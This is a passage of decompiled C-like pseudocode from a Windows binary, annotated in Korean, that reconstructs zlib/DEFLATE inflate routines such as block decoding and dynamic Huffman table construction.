            || ((v5 = *(inflate_state + 40), v30 >= v29) ? (v8 = *(inflate_state + 44) - v30) : (v8 = v29 - v30 - 1), !v8) )
          {
            *(inflate_state + 52) = v5;
            v31 = copyBufferedDataWithCallback_403BD6(inflate_state, z_stream, flag);
            v5 = *(inflate_state + 52);
            flag = v31;
            v32 = *(inflate_state + 48);
            v42 = v32;
            if ( v5 >= v32 )
              v8 = *(inflate_state + 44) - v5;
            else
              v8 = v32 - v5 - 1;
            v46 = *(inflate_state + 44);
            if ( v5 == v46 )
            {
              v33 = *(inflate_state + 40);
              if ( v42 != v33 )
              {
                v5 = *(inflate_state + 40);
                if ( v33 >= v42 )
                  v8 = &v46[-v33];
                else
                  v8 = v42 - v33 - 1;
              }
            }
            if ( !v8 )
              goto LABEL_85;
          }
        }
        flag = 0;
        *v5++ = *(v6 + 8);
        v48 = --v8;
        goto LABEL_80;
      case 7:
        if ( inflate_statea > 7 )
        {
          inflate_statea -= 8;
          ++v49;
          --v50;
        }
        *(inflate_state + 52) = v5;
        v37 = copyBufferedDataWithCallback_403BD6(inflate_state, z_stream, flag);
        v5 = *(inflate_state + 52);
        if ( *(inflate_state + 48) == v5 )
        {
          *v6 = 8;
LABEL_92:
          *(inflate_state + 32) = Srca;
          *(inflate_state + 28) = inflate_statea;
          *(z_stream + 1) = v49;
          v39 = &v50[-*z_stream];
          *z_stream = v50;
          *(z_stream + 2) += v39;
          *(inflate_state + 52) = v5;
          result = copyBufferedDataWithCallback_403BD6(inflate_state, z_stream, 1);
        }
        else
        {
          *(inflate_state + 32) = Srca;
          *(inflate_state + 28) = inflate_statea;
          *(z_stream + 1) = v49;
          v38 = &v50[-*z_stream];
          *z_stream = v50;
          *(z_stream + 2) += v38;
          *(inflate_state + 52) = v5;
          result = copyBufferedDataWithCallback_403BD6(inflate_state, z_stream, v37);
        }
        return result;
      case 8:
        goto LABEL_92;
      case 9:
        goto LABEL_83;
      default:
        *(inflate_state + 32) = Srca;
        *(inflate_state + 28) = inflate_statea;
        *(z_stream + 1) = v49;
        v40 = &v50[-*z_stream];
        *z_stream = v50;
        *(z_stream + 2) += v40;
        *(inflate_state + 52) = v5;
        return copyBufferedDataWithCallback_403BD6(inflate_state, z_stream, -2);
    }
  }
}


// --- Metadata ---
// Function Name: retFuncPointer_4042AF
// Address: 0x4042AF
// Signature: unknown_signature
// ---------------
int __cdecl retFuncPointer_4042AF(int a1, int a2)
{
  return (*(a2 + 36))(*(a2 + 40), a1);          // 함수 포인터 반환 
}


// --- Metadata ---
// Function Name: initObject_4042C0
// Address: 0x4042C0
// Signature: unknown_signature
// ---------------
int (__cdecl *__cdecl initObject_4042C0(_DWORD *a1, int a2, _DWORD *a3))(_DWORD, _DWORD, _DWORD)
{
  int v3; // eax
  int (__cdecl *result)(_DWORD, _DWORD, _DWORD); // eax

  if ( a3 )                                     // 구조체 초기화 
    *a3 = a1[15];
  if ( *a1 == 4 || *a1 == 5 )
    (*(a2 + 36))(*(a2 + 40), a1[3]);
  if ( *a1 == 6 )
    retFuncPointer_4042AF(a1[1], a2);
  v3 = a1[10];
  *a1 = 0;
  a1[13] = v3;
  a1[12] = v3;
  result = a1[14];
  a1[7] = 0;
  a1[8] = 0;
  if ( result )
  {
    result = result(0, 0, 0);
    a1[15] = result;
    *(a2 + 48) = result;
  }
  return result;
}


// --- Metadata ---
// Function Name: CreateSessionContext_40432B
// Address: 0x40432B
// Signature: unknown_signature
// ---------------
_DWORD *__cdecl CreateSessionContext_40432B(int a1, int a2, int a3)
{
  _DWORD *sessionContext; // edi
  int v4; // eax
  int v5; // eax

  sessionContext = (*(a1 + 32))(*(a1 + 40), 1, 64);// 구조체 SessionContext를 동적으로 할당하고 초기화 
  if ( !sessionContext )
    return 0;
  v4 = (*(a1 + 32))(*(a1 + 40), 8, 1440);
  sessionContext[9] = v4;
  if ( !v4 )
  {
    (*(a1 + 36))(*(a1 + 40), sessionContext);
    return 0;
  }
  v5 = (*(a1 + 32))(*(a1 + 40), 1, a3);
  sessionContext[10] = v5;
  if ( !v5 )
  {
    (*(a1 + 36))(*(a1 + 40), sessionContext[9]);
    (*(a1 + 36))(*(a1 + 40), sessionContext);
    return 0;
  }
  *sessionContext = 0;
  sessionContext[11] = a3 + v5;
  sessionContext[14] = a2;
  initObject_4042C0(sessionContext, a1, 0);
  return sessionContext;
}


// --- Metadata ---
// Function Name: inflateCompressedBlock_4043B6
// Address: 0x4043B6
// Signature: unknown_signature
// ---------------
int __cdecl inflateCompressedBlock_4043B6(int state, void *Src, int a3)
{
  void *v5; // edx  비트 스트림 디코딩 및 블록 압축 해제 
  unsigned __int8 *v6; // ebx
  unsigned int v7; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // ecx
  unsigned int v17; // ecx
  int v18; // eax
  void *v19; // ecx
  unsigned int v20; // eax
  unsigned int v21; // edx
  int v22; // eax
  unsigned int v23; // ecx
  void *v24; // edx
  unsigned int v25; // eax
  unsigned int v26; // ecx
  int v27; // eax
  unsigned int v28; // eax
  unsigned int v29; // ecx
  int v30; // eax
  unsigned int i; // ecx
  int v32; // eax
  int v33; // eax
  unsigned int v34; // ecx
  unsigned int v35; // eax
  int v36; // edx
  int v37; // ecx
  int v38; // eax
  size_t v39; // ecx
  int v40; // eax
  int v41; // edx
  int v42; // ecx
  int v43; // eax
  unsigned int v44; // eax
  int v45; // eax
  unsigned __int8 *v46; // eax
  int v47; // eax
  void *v48; // ecx
  unsigned int v49; // eax
  int v50; // eax
  unsigned __int8 *v51; // eax
  int result; // eax
  unsigned int v53; // eax
  unsigned __int8 *v54; // eax
  unsigned __int8 *v55; // eax
  bool v56; // zf
  unsigned __int8 *v57; // eax
  unsigned __int8 *v58; // eax
  unsigned __int8 *v59; // eax
  unsigned __int8 *v60; // ecx
  unsigned __int8 *v61; // eax
  int *v62; // [esp-1Ch] [ebp-54h]
  int *v63; // [esp-14h] [ebp-4Ch]
  int v64; // [esp-8h] [ebp-40h]
  int v65; // [esp-8h] [ebp-40h]
  int v66; // [esp-4h] [ebp-3Ch]
  int v67; // [esp+Ch] [ebp-2Ch] BYREF
  int v68; // [esp+10h] [ebp-28h] BYREF
  int v69; // [esp+14h] [ebp-24h] BYREF
  int v70; // [esp+18h] [ebp-20h] BYREF
  int v71; // [esp+1Ch] [ebp-1Ch] BYREF
  int v72; // [esp+20h] [ebp-18h] BYREF
  unsigned int v73; // [esp+24h] [ebp-14h] BYREF
  size_t v74; // [esp+28h] [ebp-10h] BYREF
  size_t Size; // [esp+2Ch] [ebp-Ch]
  void *v76; // [esp+30h] [ebp-8h]
  size_t v77; // [esp+34h] [ebp-4h]
  unsigned int statea; // [esp+40h] [ebp+8h]
  unsigned int stateb; // [esp+40h] [ebp+8h]
  unsigned int Srca; // [esp+44h] [ebp+Ch]
  void *Srcb; // [esp+44h] [ebp+Ch]

  v5 = *(state + 52);
  v6 = *Src;
  v77 = *(Src + 1);
  statea = *(state + 32);
  Srca = *(state + 28);
  v7 = *(state + 48);
  v76 = v5;
  if ( v5 >= v7 )
    v8 = *(state + 44) - v5;
  else
    v8 = v7 - v5 - 1;
  v9 = *state;
  v74 = v8;
  while ( 2 )
  {
    switch ( v9 )
    {
      case 0:
        while ( Srca < 3 )
        {
          if ( !v77 )
            goto LABEL_106;
          v10 = *v6;
          a3 = 0;
          --v77;
          statea |= v10 << Srca;
          ++v6;
          Srca += 8;
        }
        v11 = (statea & 7) >> 1;
        *(state + 24) = statea & 1;
        if ( !v11 )
        {
          Srcb = (Srca - 3);
          *state = 1;
          v16 = Srcb & 7;
          Srca = Srcb - v16;
          statea = statea >> 3 >> v16;
          goto LABEL_98;
        }
        v12 = v11 - 1;
        if ( v12 )
        {
          v13 = v12 - 1;
          if ( !v13 )
          {
            statea >>= 3;
            v14 = 3;
            Srca -= 3;
            goto LABEL_16;
          }
          if ( v13 != 1 )
            goto LABEL_98;
          *state = 9;
          *(Src + 6) = "invalid block type";
          *(state + 32) = statea >> 3;
          v53 = Srca - 3;
          goto LABEL_104;
        }
        initTable_405122(&v69, &v70, &v71, &v72);
        v15 = initObject_403CC8(v69, v70, v71, v72, Src);
        *(state + 4) = v15;
        if ( !v15 )
          goto LABEL_115;
        statea >>= 3;
        Srca -= 3;
        *state = 6;
        goto LABEL_98;
      case 1:
        v17 = Srca;
        while ( 2 )
        {
          if ( v17 < 0x20 )
          {
            if ( v77 )
            {
              v18 = *v6;
              a3 = 0;
              --v77;
              statea |= v18 << v17;
              ++v6;
              v17 += 8;
              Srca = v17;
              continue;
            }
LABEL_106:
            *(state + 32) = statea;
            *(state + 28) = Srca;
            *(Src + 1) = 0;
            goto LABEL_107;
          }
          break;
        }
        if ( statea != ~statea >> 16 )
        {
          *state = 9;
          *(Src + 6) = "invalid stored block lengths";
          goto LABEL_103;
        }
        *(state + 4) = statea;
        Srca = 0;
        statea = 0;
        if ( *(state + 4) )
          v14 = 2;
        else
LABEL_49:
          v14 = *(state + 24) != 0 ? 7 : 0;
LABEL_16:
        *state = v14;
        goto LABEL_98;
      case 2:
        if ( !v77 )
          goto LABEL_106;
        if ( !v8 )
        {
          if ( (v19 = *(state + 44), v5 != v19)
            || (v20 = *(state + 48), v21 = *(state + 40), v21 == v20)
            || ((v76 = *(state + 40), v21 >= v20) ? (v74 = v19 - v21) : (v74 = v20 - v21 - 1), !v74) )
          {
            *(state + 52) = v76;
            v22 = copyBufferedDataWithCallback_403BD6(state, Src, a3);
            v23 = *(state + 48);
            a3 = v22;
            v76 = *(state + 52);
            if ( v76 >= v23 )
              v74 = *(state + 44) - v76;
            else
              v74 = v23 - v76 - 1;
            v24 = *(state + 44);
            if ( v76 == v24 )
            {
              v25 = *(state + 40);
              if ( v25 != v23 )
              {
                v76 = *(state + 40);
                if ( v25 >= v23 )
                  v74 = v24 - v25;
                else
                  v74 = v23 - v25 - 1;
              }
            }
            if ( !v74 )
            {
              *(state + 32) = statea;
              *(state + 28) = Srca;
              *(Src + 1) = v77;
LABEL_107:
              v55 = &v6[-*Src];
              *Src = v6;
              *(Src + 2) += v55;
              *(state + 52) = v76;
              return copyBufferedDataWithCallback_403BD6(state, Src, a3);
            }
          }
        }
        a3 = 0;
        Size = *(state + 4);
        if ( Size > v77 )
          Size = v77;
        if ( Size > v74 )
          Size = v74;
        memcpy(v76, v6, Size);
        v77 -= Size;
        v76 = v76 + Size;
        v74 -= Size;
        v6 += Size;
        v56 = *(state + 4) == Size;
        *(state + 4) -= Size;
        if ( v56 )
          goto LABEL_49;
        goto LABEL_98;
      case 3:
        v26 = Srca;
        while ( 2 )
        {
          if ( v26 < 0xE )
          {
            if ( v77 )
            {
              v27 = *v6;
              a3 = 0;
              --v77;
              statea |= v27 << v26;
              ++v6;
              v26 += 8;
              Srca = v26;
              continue;
            }
            goto LABEL_106;
          }
          break;
        }
        v28 = statea & 0x3FFF;
        *(state + 4) = v28;
        v29 = statea & 0x1F;
        if ( v29 > 0x1D || (statea & 0x3E0) > 0x3A0 )
        {
          *state = 9;
          *(Src + 6) = "too many length or distance symbols";
LABEL_103:
          *(state + 32) = statea;
          v53 = Srca;
LABEL_104:
          *(state + 28) = v53;
          *(Src + 1) = v77;
          v54 = &v6[-*Src];
          *Src = v6;
          *(Src + 2) += v54;
          *(state + 52) = v76;
          return copyBufferedDataWithCallback_403BD6(state, Src, -3);
        }
        v30 = (*(Src + 8))(*(Src + 10), ((v28 >> 5) & 0x1F) + v29 + 258, 4);
        *(state + 12) = v30;
        if ( !v30 )
          goto LABEL_115;
        statea >>= 14;
        Srca -= 14;
        *(state + 8) = 0;
        *state = 4;
LABEL_58:
        if ( *(state + 8) < ((*(state + 4) >> 10) + 4) )
        {
          do
          {
            for ( i = Srca; i < 3; Srca = i )
            {
              if ( !v77 )
                goto LABEL_106;
              v32 = *v6;
              a3 = 0;
              --v77;
              statea |= v32 << i;
              ++v6;
              i += 8;
            }
            v33 = statea & 7;
            Srca -= 3;
            statea >>= 3;
            *(*(state + 12) + 4 * dword_40CDF0[*(state + 8)]) = v33;
            v34 = *(state + 4);
            ++*(state + 8);
          }
          while ( *(state + 8) < (v34 >> 10) + 4 );
        }
        while ( *(state + 8) < 0x13u )
          *(*(state + 12) + 4 * dword_40CDF0[(*(state + 8))++]) = 0;
        v64 = *(state + 36);
        v63 = *(state + 12);
        *(state + 16) = 7;
        Size = buildDynamicHuffmanTree_404FA0(v63, (state + 16), (state + 20), v64, Src);
        if ( Size )
        {
          v56 = Size == -3;
LABEL_112:
          if ( v56 )
          {
            (*(Src + 9))(*(Src + 10));
            *state = 9;
          }
          v66 = Size;
          *(state + 32) = statea;
          *(state + 28) = Srca;
          *(Src + 1) = v77;
          v58 = &v6[-*Src];
          *Src = v6;
          *(Src + 2) += v58;
          *(state + 52) = v76;
          return copyBufferedDataWithCallback_403BD6(state, Src, v66);
        }
        *(state + 8) = 0;
        *state = 5;
LABEL_68:
        while ( *(state + 8) < ((*(state + 4) >> 5) & 0x1F) + (*(state + 4) & 0x1Fu) + 258 )
        {
          v35 = *(state + 16);
          while ( Srca < v35 )
          {
            if ( !v77 )
              goto LABEL_106;
            v36 = *v6;
            a3 = 0;
            --v77;
            statea |= v36 << Srca;
            ++v6;
            Srca += 8;
          }
          v37 = *(state + 20);
          v38 = statea & dword_40BCA8[v35];
          v73 = *(v37 + 8 * v38 + 4);
          v39 = *(v37 + 8 * v38 + 1);
          Size = v39;
          if ( v73 >= 0x10 )
          {
            if ( v73 == 18 )
              v40 = 7;
            else
              v40 = v73 - 14;
            v74 = v73 != 18 ? 3 : 11;
            while ( Srca < v40 + Size )
            {
              if ( !v77 )
                goto LABEL_106;
              v41 = *v6;
              a3 = 0;
              --v77;
              statea |= v41 << Srca;
              ++v6;
              Srca += 8;
            }
            stateb = statea >> Size;
            v74 += stateb & dword_40BCA8[v40];
            statea = stateb >> v40;
            v42 = *(state + 8);
            Srca -= Size + v40;
            if ( v42 + v74 > ((*(state + 4) >> 5) & 0x1F) + (*(state + 4) & 0x1Fu) + 258 )
            {
LABEL_110:
              (*(Src + 9))(*(Src + 10), *(state + 12));
              *state = 9;
              *(Src + 6) = "invalid bit length repeat";
              *(state + 32) = statea;
              *(state + 28) = Srca;
              *(Src + 1) = v77;
              v57 = &v6[-*Src];
              *Src = v6;
              *(Src + 2) += v57;
              *(state + 52) = v76;
              return copyBufferedDataWithCallback_403BD6(state, Src, -3);
            }
            if ( v73 == 16 )
            {
              if ( !v42 )
                goto LABEL_110;
              v43 = *(*(state + 12) + 4 * v42 - 4);
            }
            else
            {
              v43 = 0;
            }
            do
            {
              *(*(state + 12) + 4 * v42++) = v43;
              --v74;
            }
            while ( v74 );
            *(state + 8) = v42;
          }
          else
          {
            statea >>= v39;
            Srca -= v39;
            *(*(state + 12) + 4 * (*(state + 8))++) = v73;
          }
        }
        v65 = *(state + 36);
        v44 = *(state + 4);
        *(state + 20) = 0;
        v73 = 9;
        v62 = *(state + 12);
        v74 = 6;
        Size = BuildDynamicHuffmanTrees_40501F(
                 (v44 & 0x1F) + 257,
                 ((v44 >> 5) & 0x1F) + 1,
                 v62,
                 &v73,
                 &v74,
                 &v67,
                 &v68,
                 v65,
                 Src);
        if ( Size )
        {
          v56 = Size == -3;
          goto LABEL_112;
        }
        v45 = initObject_403CC8(v73, v74, v67, v68, Src);
        if ( !v45 )
        {
LABEL_115:
          *(state + 32) = statea;
          *(state + 28) = Srca;
          *(Src + 1) = v77;
          v59 = &v6[-*Src];
          *Src = v6;
          *(Src + 2) += v59;
          *(state + 52) = v76;
          return copyBufferedDataWithCallback_403BD6(state, Src, -4);
        }
        *(state + 4) = v45;
        (*(Src + 9))(*(Src + 10));
        *state = 6;
LABEL_92:
        *(state + 32) = statea;
        *(state + 28) = Srca;
        *(Src + 1) = v77;
        v46 = &v6[-*Src];
        *Src = v6;
        *(Src + 2) += v46;
        *(state + 52) = v76;
        v47 = InflateMainLoop_403CFC(state, Src, a3);
        if ( v47 != 1 )
          goto LABEL_119;
        a3 = 0;
        retFuncPointer_4042AF(*(state + 4), Src);
        v6 = *Src;
        v77 = *(Src + 1);
        statea = *(state + 32);
        v48 = *(state + 52);
        Srca = *(state + 28);
        v49 = *(state + 48);
        v76 = v48;
        if ( v48 >= v49 )
          v50 = *(state + 44) - v76;
        else
          v50 = v49 - v48 - 1;
        v56 = *(state + 24) == 0;
        v74 = v50;
        if ( v56 )
        {
          *state = 0;
LABEL_98:
          v9 = *state;
          if ( *state > 9u )
          {
LABEL_99:
            *(state + 32) = statea;
            *(state + 28) = Srca;
            *(Src + 1) = v77;
            v51 = &v6[-*Src];
            *Src = v6;
            *(Src + 2) += v51;
            *(state + 52) = v76;
            return copyBufferedDataWithCallback_403BD6(state, Src, -2);
          }
          v8 = v74;
          v5 = v76;
          continue;
        }
        *state = 7;
LABEL_117:
        *(state + 52) = v76;
        v47 = copyBufferedDataWithCallback_403BD6(state, Src, a3);
        v56 = *(state + 48) == *(state + 52);
        v76 = *(state + 52);
        if ( v56 )
        {
          *state = 8;
LABEL_121:
          *(state + 32) = statea;
          *(state + 28) = Srca;
          *(Src + 1) = v77;
          v61 = &v6[-*Src];
          *Src = v6;
          *(Src + 2) += v61;
          *(state + 52) = v76;
          result = copyBufferedDataWithCallback_403BD6(state, Src, 1);
        }
        else
        {
          *(state + 32) = statea;
          *(state + 28) = Srca;
          *(Src + 1) = v77;
          v60 = &v6[-*Src];
          *Src = v6;
          *(Src + 2) += v60;
          *(state + 52) = v76;
LABEL_119:
          result = copyBufferedDataWithCallback_403BD6(state, Src, v47);
        }
        return result;
      case 4:
        goto LABEL_58;
      case 5:
        goto LABEL_68;
      case 6:
        goto LABEL_92;
      case 7:
        goto LABEL_117;
      case 8:
        goto LABEL_121;
      case 9:
        goto LABEL_103;
      default:
        goto LABEL_99;
    }
  }
}


// --- Metadata ---
// Function Name: freeObject_404BE5
// Address: 0x404BE5
// Signature: unknown_signature
// ---------------
int __cdecl freeObject_404BE5(_DWORD *a1, int a2)
{
  initObject_4042C0(a1, a2, 0);
  (*(a2 + 36))(*(a2 + 40), a1[10]);             // 내부 포인터 해제, 콜백 기반 
  (*(a2 + 36))(*(a2 + 40), a1[9]);
  (*(a2 + 36))(*(a2 + 40), a1);
  return 0;
}


// --- Metadata ---
// Function Name: BuildHuffmanDecodingTable_404C19
// Address: 0x404C19
// Signature: unknown_signature
// ---------------
int __cdecl BuildHuffmanDecodingTable_404C19(int *symbol_len, unsigned int symbol_num, unsigned int literal_num, int literal_ptr, int len_ptr, _DWORD *output_ptr, unsigned int *maxBit, int decodingTable_ptr, unsigned int *tableSize_counter, unsigned int *output_symbol_order)
{
  int *v10; // ecx
  unsigned int v11; // esi zlib/DEFLATE의 압축 해제를 위한 동적 허프만 트리 테이블을 구성 
  int v12; // eax
  int *v15; // eax
  unsigned int v16; // esi
  unsigned int v17; // ecx
  int *v18; // esi
  unsigned int v19; // eax
  int v20; // ebx
  int *v21; // esi
  int v22; // ebx
  int v23; // esi
  int v24; // edi
  int v25; // ebx
  int v26; // ecx
  unsigned int v27; // eax
  int v28; // edi
  int *v29; // ebx
  unsigned int v30; // edi
  int v31; // eax
  int v32; // ecx
  int v33; // eax
  int v34; // ebx
  int v35; // edi
  bool v36; // zf
  int v37; // eax
  unsigned int v38; // ecx
  unsigned int v39; // eax
  int *v40; // esi
  unsigned int v41; // eax
  unsigned int v42; // edx
  unsigned int v43; // eax
  unsigned int v44; // esi
  int *v45; // edx
  unsigned int v46; // esi
  unsigned int v47; // edi
  unsigned int v48; // eax
  int v49; // ecx
  unsigned int v50; // eax
  unsigned int v51; // eax
  int v52; // esi
  unsigned int v53; // eax
  _DWORD *v54; // ecx
  unsigned int v55; // eax
  unsigned int v56; // ecx
  int *i; // eax
  int v60[15]; // [esp+Ch] [ebp-F0h] BYREF
  int v61; // [esp+48h] [ebp-B4h] BYREF
  int v62[15]; // [esp+4Ch] [ebp-B0h]
  int v63; // [esp+88h] [ebp-74h] BYREF
  int code_len_count[14]; // [esp+8Ch] [ebp-70h] BYREF
  int v65; // [esp+C4h] [ebp-38h] BYREF
  int v66; // [esp+C8h] [ebp-34h]
  int v67; // [esp+CCh] [ebp-30h]
  int v68; // [esp+D0h] [ebp-2Ch]
  int v69; // [esp+D4h] [ebp-28h]
  int v70; // [esp+D8h] [ebp-24h]
  int *v71; // [esp+DCh] [ebp-20h]
  unsigned int v72; // [esp+E0h] [ebp-1Ch]
  int v73; // [esp+E4h] [ebp-18h]
  int v74; // [esp+E8h] [ebp-14h]
  unsigned int *v75; // [esp+ECh] [ebp-10h]
  unsigned int v76; // [esp+F0h] [ebp-Ch]
  int v77; // [esp+F4h] [ebp-8h]
  int v78; // [esp+F8h] [ebp-4h]
  unsigned int symbol_lena; // [esp+104h] [ebp+8h]
  unsigned int symbol_lenb; // [esp+104h] [ebp+8h]
  int symbol_numa; // [esp+108h] [ebp+Ch]
  unsigned int maxBita; // [esp+11Ch] [ebp+20h]

  v10 = symbol_len;
  v63 = 0;
  code_len_count[0] = 0;
  code_len_count[1] = 0;
  code_len_count[2] = 0;
  code_len_count[3] = 0;
  code_len_count[4] = 0;
  code_len_count[5] = 0;
  code_len_count[6] = 0;
  code_len_count[7] = 0;
  code_len_count[8] = 0;
  code_len_count[9] = 0;
  code_len_count[10] = 0;
  code_len_count[11] = 0;
  code_len_count[12] = 0;
  code_len_count[13] = 0;
  v65 = 0;
  v11 = symbol_num;
  do
  {
    v12 = *v10++;
    ++*(&v63 + v12);
    --v11;
  }
  while ( v11 );
  if ( v63 == symbol_num )
  {
    *output_ptr = 0;
    *maxBit = 0;
    return 0;
  }
  v15 = code_len_count;
  v16 = *maxBit;
  v17 = 1;
  maxBita = *maxBit;
  do
  {
    if ( *v15 )
      break;
    ++v17;
    ++v15;
  }
  while ( v17 <= 0xF );
  v78 = v17;
  if ( v16 < v17 )
    maxBita = v17;
  v18 = &v65;
  v19 = 15;
  do
  {
    if ( *v18 )
      break;
    --v19;
    --v18;
  }
  while ( v19 );
  v73 = v19;
  if ( maxBita > v19 )
    maxBita = v19;
  v20 = 1 << v17;
  *maxBit = maxBita;
  if ( v17 < v19 )
  {
    v21 = &v63 + v17;
    do
    {
      v22 = v20 - *v21;
      if ( v22 < 0 )
        return -3;
      ++v17;
      ++v21;
      v20 = 2 * v22;
    }
    while ( v17 < v19 );
  }
  v23 = 4 * v19;
  v24 = *(&v63 + v19);
  v25 = v20 - v24;
  v67 = v25;
  if ( v25 < 0 )
    return -3;
  v62[0] = 0;
  *(&v63 + v19) = v25 + v24;
  v26 = 0;
  v27 = v19 - 1;
  if ( v27 )
  {
    v28 = 0;
    do
    {
      v26 += code_len_count[v28++];
      --v27;
      v62[v28] = v26;
    }
    while ( v27 );
  }
  v29 = symbol_len;
  v30 = 0;
  do
  {
    v31 = *v29++;
    if ( v31 )
    {
      v32 = *(&v61 + v31);
      output_symbol_order[v32] = v30;
      *(&v61 + v31) = v32 + 1;
    }
    ++v30;
  }
  while ( v30 < symbol_num );
  v33 = *(&v61 + v23);
  v77 = -1;
  symbol_numa = v33;
  v76 = 0;
  v75 = output_symbol_order;
  v34 = -maxBita;
  v61 = 0;
  v60[0] = 0;
  v72 = 0;
  symbol_lena = 0;
  if ( v78 <= v73 )
  {
    v35 = v70;
    v68 = v78 - 1;
    v71 = &v63 + v78;
    while ( 1 )
    {
      v36 = *v71 == 0;
      v74 = *v71 - 1;
      if ( !v36 )
        break;
LABEL_61:
      ++v78;
      ++v71;
      ++v68;
      if ( v78 > v73 )
        goto LABEL_62;
    }
    while ( 1 )
    {
      v37 = v34 + maxBita;
      if ( v78 > (v34 + maxBita) )
        break;
LABEL_45:
      BYTE1(v69) = v78 - v34;
      if ( v75 < &output_symbol_order[symbol_numa] )
      {
        v50 = *v75;
        if ( *v75 >= literal_num )
        {
          v51 = 4 * (v50 - literal_num);
          LOBYTE(v69) = *(v51 + len_ptr) + 80;
          v35 = *(v51 + literal_ptr);
        }
        else
        {
          v35 = *v75;
          LOBYTE(v69) = v50 < 0x100 ? 0 : 96;
        }
        ++v75;
      }
      else
      {
        LOBYTE(v69) = -64;
      }
      v52 = 1 << (v78 - v34);
      v53 = v76 >> v34;
      if ( v76 >> v34 < symbol_lena )
      {
        v54 = (v72 + 8 * v53);
        do
        {
          v53 += v52;
          *v54 = v69;
          v54[1] = v35;
          v54 += 2 * v52;
        }
        while ( v53 < symbol_lena );
      }
      v55 = 1 << v68;
      v56 = v76;
      while ( (v55 & v56) != 0 )
      {
        v56 ^= v55;
        v55 >>= 1;
      }
      v76 = v55 ^ v56;
      for ( i = &v61 + v77; (v76 & ((1 << v34) - 1)) != *i; --i )
      {
        --v77;
        v34 -= maxBita;
      }
      if ( !v74-- )
        goto LABEL_61;
    }
    while ( 1 )
    {
      ++v77;
      v34 += maxBita;
      v66 = maxBita + v37;
      symbol_lenb = v73 - v34;
      if ( v73 - v34 > maxBita )
        symbol_lenb = maxBita;
      v38 = v78 - v34;
      v39 = 1 << (v78 - v34);
      if ( v39 > v74 + 1 )
      {
        v40 = v71;
        v41 = -1 - v74 + v39;
        if ( v38 < symbol_lenb )
        {
          while ( ++v38 < symbol_lenb )
          {
            v42 = v40[1];
            ++v40;
            v43 = 2 * v41;
            if ( v43 <= v42 )
              break;
            v41 = v43 - v42;
          }
        }
      }
      symbol_lena = 1 << v38;
      v44 = *tableSize_counter + (1 << v38);
      if ( v44 > 0x5A0 )
        return -3;
      v72 = decodingTable_ptr + 8 * *tableSize_counter;
      v45 = &v60[v77];
      *v45 = v72;
      *tableSize_counter = v44;
      if ( v77 )
      {
        v46 = v76;
        v47 = v72;
        *(&v61 + v77) = v76;
        LOBYTE(v69) = v38;
        BYTE1(v69) = maxBita;
        v48 = v46 >> (v34 - maxBita);
        v49 = *(v45 - 1);
        v35 = ((v47 - v49) >> 3) - v48;
        *(v49 + 8 * v48) = v69;
        *(v49 + 8 * v48 + 4) = v35;
      }
      else
      {
        *output_ptr = v72;
      }
      v37 = v66;
      if ( v78 <= v66 )
        goto LABEL_45;
    }
  }
LABEL_62:
  if ( !v67 || v73 == 1 )
    return 0;
  return -5;
}


// --- Metadata ---
// Function Name: buildDynamicHuffmanTree_404FA0
// Address: 0x404FA0
// Signature: unknown_signature
// ---------------
int __cdecl buildDynamicHuffmanTree_404FA0(int *a1, unsigned int *a2, _DWORD *a3, int a4, int a5)
{
  unsigned int *v5; // eax
  int v7; // eax
  int v8; // ebx
  unsigned int v9; // [esp+4h] [ebp-4h] BYREF

  v9 = 0;
  v5 = (*(a5 + 32))(*(a5 + 40), 19, 4);         // 메모리 할당 
  if ( !v5 )
    return -4;
  v7 = BuildHuffmanDecodingTable_404C19(a1, 0x13u, 0x13u, 0, 0, a3, a2, a4, &v9, v5);
  v8 = v7;
  if ( v7 == -3 )                               // 동적 허프만 트리 생성 
  {
    *(a5 + 24) = "oversubscribed dynamic bit lengths tree";
  }
  else if ( v7 == -5 || !*a2 )
  {
    *(a5 + 24) = "incomplete dynamic bit lengths tree";
    v8 = -3;
  }
  (*(a5 + 36))(*(a5 + 40));
  return v8;
}


// --- Metadata ---
// Function Name: BuildDynamicHuffmanTrees_40501F
// Address: 0x40501F
// Signature: unknown_signature
// ---------------
int __cdecl BuildDynamicHuffmanTrees_40501F(unsigned int a1, unsigned int a2, int *a3, unsigned int *a4, unsigned int *a5, _DWORD *a6, _DWORD *a7, int a8, int a9)
{
  unsigned int *v10; // eax 문자/길이 트리와 거리 트리를 위한 허프만 디코딩 테이블 두개를 생성 
  int v12; // eax
  int v13; // edi
  unsigned int v14; // [esp+4h] [ebp-4h] BYREF zlib이나 ZIP, gzip 포맷에서 사용되는 동적 허프만 블록을 처리할 때 필요 
  unsigned int *v15; // [esp+30h] [ebp+28h]

  v14 = 0;
  v10 = (*(a9 + 32))(*(a9 + 40), 288, 4);
  v15 = v10;
  if ( !v10 )
    return -4;
  v12 = BuildHuffmanDecodingTable_404C19(a3, a1, 0x101u, &unk_40CE6C, &unk_40CEE8, a6, a4, a8, &v14, v10);
  if ( v12 )                                    // literal/length tree 생성 
  {
    if ( v12 == -3 )
    {
      *(a9 + 24) = "oversubscribed literal/length tree";
      goto LABEL_20;
    }
    if ( v12 == -4 )
      goto LABEL_20;
LABEL_18:
    *(a9 + 24) = "incomplete literal/length tree";
    goto LABEL_19;
  }
  if ( !*a4 )
    goto LABEL_18;
  v12 = BuildHuffmanDecodingTable_404C19(&a3[a1], a2, 0, &unk_40CF64, &unk_40CFDC, a7, a5, a8, &v14, v15);
  if ( v12 )
  {
    switch ( v12 )                              // distance tree 생성 
    {
      case -3:
        *(a9 + 24) = "oversubscribed distance tree";
        break;
      case -5:
        *(a9 + 24) = "incomplete distance tree";
LABEL_19:
        v12 = -3;
        break;
      case -4:
        break;
      default:
LABEL_14:
        *(a9 + 24) = "empty distance tree with lengths";
        goto LABEL_19;
    }
LABEL_20:
    v13 = v12;
    goto LABEL_21;
  }
  if ( !*a5 && a1 > 0x101 )
    goto LABEL_14;
  v13 = 0;
LABEL_21:
  (*(a9 + 36))(*(a9 + 40));
  return v13;
}


// --- Metadata ---
// Function Name: initTable_405122
// Address: 0x405122
// Signature: unknown_signature
// ---------------
int __cdecl initTable_405122(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  *a1 = 9;
  *a2 = 5;
  *a3 = &unk_40BCF0;                            // 포인터 4개를 전달받아서 값 설정 -> 테이블 주소로 추정 
  *a4 = &unk_40CCF0;
  return 0;
}


// --- Metadata ---
// Function Name: InflateHuffmanBlock_40514D
// Address: 0x40514D
